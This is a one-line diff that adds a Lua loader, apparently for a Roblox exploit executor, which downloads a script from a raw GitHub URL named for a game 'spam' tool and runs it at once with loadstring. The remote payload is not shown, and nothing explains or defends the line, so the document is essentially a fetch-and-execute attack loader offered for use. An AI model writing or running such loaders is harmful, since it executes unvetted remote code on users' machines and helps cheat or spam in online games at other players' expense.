@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/the-eternal-abyss-spam4-7u97mre1hxp67m.lua"))()
